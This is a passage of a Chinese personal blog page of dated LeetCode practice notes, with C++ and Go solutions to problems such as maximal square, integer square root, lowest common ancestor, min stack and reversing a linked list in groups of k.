class="number">1</span>, <span class="number">2</span>, <span class="number">-1</span>, <span class="number">-1</span>&#125;</span><br><span class="line">	t := []<span class="keyword">int</span>&#123;<span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>&#125;</span><br><span class="line">	S := creatTree(s)</span><br><span class="line">	T := creatTree(t)</span><br><span class="line">	fmt.Println(isSubtree(S, T))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-5-9"><a href="#2020-5-9" class="headerlink" title="2020/5/9"></a>2020/5/9</h3><p>昨天脑子已经不清楚了，昨天的题目自己稍微写了一下，就挂个题解吧，觉得脑子不清楚的时候，效率确实差</p>
<h4 id="leetcode-211-最大正方形-C"><a href="#leetcode-211-最大正方形-C" class="headerlink" title="leetcode 211. 最大正方形_C++"></a>leetcode 211. 最大正方形_C++</h4><p>bruteforce</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maximalSquare</span><span class="params">(vector&lt;vector&lt;<span class="keyword">char</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (matrix.<span class="built_in">size</span>() == <span class="number">0</span> || matrix[<span class="number">0</span>].<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> maxSide = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> rows = matrix.<span class="built_in">size</span>(), columns = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rows; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; columns; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (matrix[i][j] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// 遇到一个 1 作为正方形的左上角</span></span><br><span class="line">                maxSide = <span class="built_in">max</span>(maxSide, <span class="number">1</span>);</span><br><span class="line">                <span class="comment">// 计算可能的最大正方形边长</span></span><br><span class="line">                <span class="keyword">int</span> currentMaxSide = <span class="built_in">min</span>(rows - i, columns - j);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">1</span>; k &lt; currentMaxSide; k++) &#123;</span><br><span class="line">                    <span class="comment">// 判断新增的一行一列是否均为 1</span></span><br><span class="line">                    <span class="keyword">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">if</span> (matrix[i + k][j + k] == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> m = <span class="number">0</span>; m &lt; k; m++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (matrix[i + k][j + m] == <span class="string">&#x27;0&#x27;</span> || matrix[i + m][j + k] == <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">                            flag = <span class="literal">false</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                        maxSide = <span class="built_in">max</span>(maxSide, k + <span class="number">1</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> maxSquare = maxSide * maxSide;</span><br><span class="line">    <span class="keyword">return</span> maxSquare;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>dp</p>
<p>这题还可以dp我是真的没想到，但看了题解之后觉得想到是正常的，还是要多练练</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maximalSquare</span><span class="params">(vector&lt;vector&lt;<span class="keyword">char</span>&gt;&gt;&amp; matrix)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (matrix.<span class="built_in">size</span>() == <span class="number">0</span> || matrix[<span class="number">0</span>].<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> maxSide = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> rows = matrix.<span class="built_in">size</span>(), columns = matrix[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(rows, vector&lt;<span class="keyword">int</span>&gt;(columns));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rows; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; columns; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (matrix[i][j] == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i == <span class="number">0</span> || j == <span class="number">0</span>) &#123;</span><br><span class="line">                    dp[i][j] = <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">min</span>(<span class="built_in">min</span>(dp[i - <span class="number">1</span>][j], dp[i][j - <span class="number">1</span>]), dp[i - <span class="number">1</span>][j - <span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                maxSide = <span class="built_in">max</span>(maxSide, dp[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> maxSquare = maxSide * maxSide;</span><br><span class="line">    <span class="keyword">return</span> maxSquare;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="leetcode-69-x-的平方根-C"><a href="#leetcode-69-x-的平方根-C" class="headerlink" title="leetcode 69. x 的平方根_C++"></a>leetcode 69. x 的平方根_C++</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这题出的有点离谱，感觉考的是数学</span></span><br><span class="line"><span class="comment">// 可惜，我数学拉垮了</span></span><br><span class="line"><span class="comment">// 我选择二分</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mySqrt</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> low=<span class="number">0</span>,high=x,ans=<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span> (low&lt;=high)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid=low+(high-low)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>((<span class="keyword">long</span> <span class="keyword">long</span>)mid*(<span class="keyword">long</span> <span class="keyword">long</span>)mid&lt;=x)&#123;</span><br><span class="line">            low=mid+<span class="number">1</span>;</span><br><span class="line">            ans=mid;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            high=mid<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">mySqrt</span>(<span class="number">4</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2020-5-10"><a href="#2020-5-10" class="headerlink" title="2020/5/10"></a>2020/5/10</h3><h4 id="leetcode-236-二叉树的最近公共祖先-C"><a href="#leetcode-236-二叉树的最近公共祖先-C" class="headerlink" title="leetcode 236. 二叉树的最近公共祖先_C++"></a>leetcode 236. 二叉树的最近公共祖先_C++</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    TreeNode *left;</span><br><span class="line">    TreeNode *right;</span><br><span class="line">    <span class="built_in">TreeNode</span>(<span class="keyword">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">left</span>(<span class="literal">NULL</span>), <span class="built_in">right</span>(<span class="literal">NULL</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="literal">nullptr</span>) <span class="keyword">return</span> root;</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;val==p-&gt;val||root-&gt;val==q-&gt;val) <span class="keyword">return</span> root;</span><br><span class="line">    TreeNode *left=<span class="built_in">lowestCommonAncestor</span>(root-&gt;left,p,q);</span><br><span class="line">    TreeNode *right=<span class="built_in">lowestCommonAncestor</span>(root-&gt;right,p,q);</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span>(left!=<span class="literal">NULL</span>&amp;&amp;right!=<span class="literal">NULL</span>) <span class="keyword">return</span> root;<span class="comment">//如果p,q刚好在左右两个子树上</span></span><br><span class="line">    <span class="keyword">if</span>(left==<span class="literal">NULL</span>) <span class="keyword">return</span> right;<span class="comment">//仅在右子树</span></span><br><span class="line">    <span class="keyword">return</span> left;<span class="comment">//仅在左子树</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">TreeNode* <span class="title">CreateTree</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode* root=<span class="keyword">new</span> <span class="built_in">TreeNode</span>(a[<span class="number">0</span>]);</span><br><span class="line">    queue&lt;TreeNode*&gt; q;</span><br><span class="line">    q.<span class="built_in">push</span>(root);</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(num&lt;n)&#123;</span><br><span class="line">        TreeNode* top=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span>(top-&gt;left==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[num]!=<span class="number">-1</span>)&#123;</span><br><span class="line">                top-&gt;left=<span class="keyword">new</span> <span class="built_in">TreeNode</span>(a[num]);</span><br><span class="line">                q.<span class="built_in">push</span>(top-&gt;left);</span><br><span class="line">            &#125;</span><br><span class="line">            num++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num==n)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(top-&gt;right==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[num]!=<span class="number">-1</span>)&#123;</span><br><span class="line">                top-&gt;right=<span class="keyword">new</span> <span class="built_in">TreeNode</span>(a[num]);</span><br><span class="line">                q.<span class="built_in">push</span>(top-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            num++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">11</span>]=&#123;<span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">7</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    TreeNode* root=<span class="built_in">CreateTree</span>(a,<span class="number">11</span>);</span><br><span class="line">    TreeNode *p=<span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">5</span>);</span><br><span class="line">    TreeNode *q=<span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">1</span>);</span><br><span class="line">    TreeNode* ans=<span class="built_in">lowestCommonAncestor</span>(root,p,q);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans-&gt;val);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2020-5-11"><a href="#2020-5-11" class="headerlink" title="2020/5/11"></a>2020/5/11</h3><h4 id="leetcode-50-Pow-x-n-C"><a href="#leetcode-50-Pow-x-n-C" class="headerlink" title="leetcode 50. Pow(x, n)_C++"></a>leetcode 50. Pow(x, n)_C++</h4><p>算法笔记上有类似的，不过对幂次的范围没这题这么大，注意变量类型即可</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">quick</span><span class="params">(<span class="keyword">double</span> x,<span class="keyword">long</span> <span class="keyword">long</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">1.0</span>;</span><br><span class="line">    <span class="keyword">if</span>(n%<span class="number">2</span>==<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> x*<span class="built_in">quick</span>(x,n<span class="number">-1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">double</span> mul=<span class="built_in">quick</span>(x,n/<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> mul*mul;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">myPow</span><span class="params">(<span class="keyword">double</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> N=n;</span><br><span class="line">    <span class="keyword">if</span>(N&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">quick</span>(x,N);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1.0</span>/<span class="built_in">quick</span>(x,-N); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> ans=<span class="built_in">myPow</span>(<span class="number">2.0</span>,<span class="number">-2147483648</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2020-5-12"><a href="#2020-5-12" class="headerlink" title="2020/5/12"></a>2020/5/12</h3><h4 id="leetcode-155-最小栈-C"><a href="#leetcode-155-最小栈-C" class="headerlink" title="leetcode 155. 最小栈_C++"></a>leetcode 155. 最小栈_C++</h4><p>真摸鱼题</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/** initialize your data structure here. */</span></span><br><span class="line">    stack&lt;<span class="keyword">int</span>&gt; minStack;</span><br><span class="line">    stack&lt;<span class="keyword">int</span>&gt; data;</span><br><span class="line">    <span class="built_in">MinStack</span>() &#123;</span><br><span class="line">        minStack.<span class="built_in">push</span>(INT_MAX);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        data.<span class="built_in">push</span>(x);</span><br><span class="line">        minStack.<span class="built_in">push</span>(<span class="built_in">min</span>(minStack.<span class="built_in">top</span>(), x));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        data.<span class="built_in">pop</span>();</span><br><span class="line">        minStack.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> top=data.<span class="built_in">top</span>();</span><br><span class="line">        <span class="keyword">return</span> top;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> minStack.<span class="built_in">top</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2020-5-15"><a href="#2020-5-15" class="headerlink" title="2020/5/15"></a>2020/5/15</h3><h4 id="leetcode-560-和为K的子数组-C"><a href="#leetcode-560-和为K的子数组-C" class="headerlink" title="leetcode 560. 和为K的子数组_C++"></a>leetcode 560. 和为K的子数组_C++</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">20001</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前缀和</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">subarraySum</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> ans;</span><br><span class="line">    dp[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        dp[i]=dp[i<span class="number">-1</span>]+nums[i<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(dp[i]-dp[j]==k)&#123;</span><br><span class="line">                <span class="comment">//printf(&quot;%d\n&quot;,dp[i]-dp[j]);</span></span><br><span class="line">                ans++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> k=<span class="number">2</span>;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; nums=&#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="built_in">subarraySum</span>(nums,k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2020-5-16"><a href="#2020-5-16" class="headerlink" title="2020/5/16"></a>2020/5/16</h3><h4 id="leetcode-25-K-个一组翻转链表-C"><a href="#leetcode-25-K-个一组翻转链表-C" class="headerlink" title="leetcode 25. K 个一组翻转链表_C++"></a>leetcode 25. K 个一组翻转链表_C++</h4><p>感觉就是之前做过的题目的一个汇总，题解写的比自己本身的代码优雅，就记录一下题解好了</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    ListNode *next;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="keyword">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(<span class="literal">NULL</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">pair&lt;ListNode*, ListNode*&gt; <span class="title">myReverse</span><span class="params">(ListNode* head, ListNode* tail)</span> </span>&#123;</span><br><span class="line">    ListNode* prev = tail-&gt;next;</span><br><span class="line">    ListNode* p = head;</span><br><span class="line">    <span class="keyword">while</span> (prev != tail) &#123;</span><br><span class="line">        ListNode* nex = p-&gt;next;</span><br><span class="line">        p-&gt;next = prev;</span><br><span class="line">        prev = p;</span><br><span class="line">        p = nex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;tail, head&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ListNode* <span class="title">reverseKGroup</span><span class="params">(ListNode* head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    ListNode* hair = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    hair-&gt;next = head;</span><br><span class="line">    ListNode* pre = hair;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (head) &#123;</span><br><span class="line">        ListNode* tail = pre;</span><br><span class="line">        <span class="comment">// 查看剩余部分长度是否大于等于 k</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">            tail = tail-&gt;next;</span><br><span class="line">            <span class="keyword">if</span> (!tail) &#123;</span><br><span class="line">                <span class="keyword">return</span> hair-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode* nex = tail-&gt;next;</span><br><span class="line">        pair&lt;ListNode*,ListNode*&gt; p;</span><br><span class="line">        p = <span class="built_in">myReverse</span>(head, tail);</span><br><span class="line">        head=p.first;</span><br><span class="line">        tail=p.second;</span><br><span class="line">        <span class="comment">// 把子链表重新接回原链表</span></span><br><span class="line">        pre-&gt;next = head;</span><br><span class="line">        tail-&gt;next = nex;</span><br><span class="line">        pre = tail;</span><br><span class="line">        head = tail-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hair-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2020-5-17"><a href="#2020-5-17" class="headerlink" title="2020/5/17"></a>2020/5/17</h3><h4 id="leetcode-210-课程表-II-Go"><a href="#leetcode-210-课程表-II-Go" class="headerlink" title="leetcode 210. 课程表 II_Go"></a>leetcode 210. 课程表 II_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 拓扑排序</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findOrder</span><span class="params">(numCourses <span class="keyword">int</span>, prerequisites [][]<span class="keyword">int</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="comment">// build the map</span></span><br><span class="line">	ans := []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">	edges := <span class="built_in">make</span>([][]<span class="keyword">int</span>, numCourses)</span><br><span class="line">	degree := <span class="built_in">make</span>([]<span class="keyword">int</span>, numCourses) <span 